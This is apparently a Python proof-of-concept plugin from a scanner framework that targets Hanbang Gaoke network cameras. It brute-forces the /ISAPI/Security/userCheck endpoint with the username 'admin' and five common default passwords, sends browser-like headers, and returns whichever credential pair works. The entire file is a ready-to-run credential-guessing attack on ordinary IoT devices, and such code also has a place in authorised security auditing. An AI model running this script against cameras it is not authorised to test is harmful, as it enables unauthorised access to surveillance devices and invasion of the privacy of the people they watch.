# http://www.hbgk.net/zh-cn/About.aspx?faid=193&ffaid=14&lan=1 汉邦高科摄像头存在弱口令漏洞

import requests
import re
from plugin.target_parse import get_standard_url
from requests.auth import HTTPBasicAuth

def poc(url):
    target = f"{get_standard_url(url)}/ISAPI/Security/userCheck"
    try:
        session = requests.Session()
        headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
                   "Connection": "close",
                   "Referer": url,
                   "If-Modified-Since": "0",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate"}
        cookies = {"language": "zh"}
        for p in ("admin", "12345", "123456", "666666", "888888"):
            r = session.get(target, headers=headers, cookies=cookies, timeout=10, auth=HTTPBasicAuth("admin", p))
            if re.findall(r'<statusValue>(.+?)</statusValue>', r.text)[0] == '200':
                return f"{url}: --> admin/{p}"
    except:
        # traceback.print_exc()
        pass
    return None